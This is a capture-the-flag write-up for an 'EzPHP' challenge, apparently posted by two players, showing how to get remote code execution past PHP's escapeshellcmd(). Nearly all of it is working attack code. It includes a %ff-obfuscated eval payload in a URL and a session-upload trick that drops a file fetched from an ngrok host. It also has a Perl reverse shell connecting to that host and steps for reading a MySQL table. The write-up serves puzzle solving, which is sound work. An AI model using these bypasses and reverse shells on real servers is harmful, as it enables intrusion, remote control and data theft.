## Target

bypass escapeshellcmd() and filter to get RCE

## Method 1 : One-Liner Payload 

bypass escapeshellcmd() by %ff character
```
http://34.142.236.192:8091/?cmd=p%ffhp+-r+ev%ffal(s%ffubst%ffr(hex2bin(aa24636f6e6e203d206e6577206d7973716c6928276462272c2027726f6f74272c202774657374272c2022646f636b65724578616d706c6522293b0a24726573203d2024636f6e6e2d3e7175657279282273656c656374202a2066726f6d205468655f7461626c655f796f755f646f6e745f6b6e6f7722293b0a7768696c652824726f77203d20247265732d3e66657463685f6173736f63282929207b0a202020207072696e745f722824726f77293b0a7d),1))%3b
```
Useful tool : https://3v4l.org/Nk2DT

by @fredd#8512

## Method 1 : God Solution 

For EzPHP

1.Abuse PHP sessions to drop file onto system. Example
```
curl http://34.142.236.192:8091/ -H 'Cookie: PHPSESSID=yeet1' -F $'PHP_SESSION_UPLOAD_PROGRESS=& curl http://0.tcp.au.ngrok.io:11712/rs.sh -o /tmp/rs.sh&&sd\nasdasd'  -F 'file=@/dev/urandom'
```

2.Execute by http://34.142.236.192:8091/?cmd=sh%20/tmp/sess_yeet1
Reverse shell http://34.142.236.192:8091/?cmd=sh%20/tmp/rs.sh. Reverse shell payload
```
perl -e 'use Socket;$i="0.tcp.au.ngrok.io";$p=11712;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

3.Once on drop mysql bins onto the system .
```
curl https://cdn.mysql.com//Downloads/MySQL-8.1/mysql-8.1.0-linux-glibc2.28-x86_64.tar.xz -o mysql.tar.xz
```

4.get flag from the other table (will send in a bit)


by @ghostccamm 
